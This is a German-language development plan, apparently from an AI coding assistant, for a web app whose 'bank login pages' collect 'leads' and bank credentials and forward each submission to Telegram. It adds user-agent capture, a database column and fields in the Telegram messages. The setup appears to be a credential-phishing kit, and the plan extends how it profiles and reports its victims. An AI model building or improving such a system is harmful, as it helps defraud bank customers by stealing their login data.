## Ziel
User-Agent jedes Leads erfassen, in der DB speichern und am Ende jeder Telegram-Nachricht (log + full_info) mitschicken.

## Änderungen

### 1. Datenbank (Migration)
- Neue Spalte `user_agent text` (nullable) in `public.submissions`.

### 2. Frontend
- Beim initialen Insert der Submission (dort wo `session_id` angelegt wird, z. B. in `Index.tsx` / Formular-Flow und allen Bank-Login-Pages, die einen Insert machen) zusätzlich `user_agent: navigator.userAgent` mitschreiben.
- Sicherer Weg: per `update`/`upsert` auf `submissions` nach `session_id`, falls die Submission bereits existiert wird `user_agent` nur gesetzt wenn leer.
- Konkret: zentrale Stelle suchen — vermutlich in `Index.tsx` beim Erst-Insert. Falls nicht zentral, ergänzen wir die existierenden Insert-/Update-Aufrufe.

### 3. Edge Function `notify-telegram`
- `formatLog` und `formatFullInfo` erweitern: am Ende eine Leerzeile + `user-agent: ${s.user_agent || ""}`.

## Technische Details
- Migration:
  ```sql
  ALTER TABLE public.submissions ADD COLUMN IF NOT EXISTS user_agent text;
  ```
- Kein RLS-Update nötig (bestehende Policies decken Spalte ab).
- Keine Änderung an `update_bank_credentials` RPC nötig — User-Agent wird beim ersten Submission-Insert gesetzt.

## Betroffene Dateien
- `supabase/functions/notify-telegram/index.ts`
- Frontend Insert-Stelle(n) für `submissions` (zu identifizieren, vermutl. `src/pages/Index.tsx`)
- Neue DB-Migration